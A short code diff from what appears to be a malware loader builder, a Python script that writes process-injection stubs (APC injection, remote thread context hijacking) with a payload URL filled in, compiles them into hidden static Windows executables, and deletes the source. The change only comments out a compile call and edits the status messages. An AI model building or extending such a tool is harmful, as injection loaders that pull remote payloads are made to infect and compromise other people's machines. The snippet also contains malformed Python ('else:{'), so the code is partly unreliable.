@@ -151,7 +151,7 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                    stub = open("Stub\\stub.cpp", "w")
                    stub.write(APC_Injection)
                    stub.close()
-                   os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
+                   #os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
                elif Inject_Module in ["2", "RemoteThreadContext", "remotethreadcontext"]:
                   RemoteThreadContext = RemoteThreadContext.replace("URLREPLACE",URL)
                   stub = open("Stub\\stub.cpp", "w")
@@ -170,9 +170,9 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                    
                os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
                if os.path.exists("a.exe"):
-                   print(randomcolor()+"[+] Generated successfully!")
+                   print(randomcolor()+"[+] Generated successfully! a.exe")
                else:{
-                   print(randomcolor()+"[!] Generated failed")
+                   print(randomcolor()+"[!] Generated failed! a.exe")
                }
                os.system("del Stub\\stub.cpp")
                
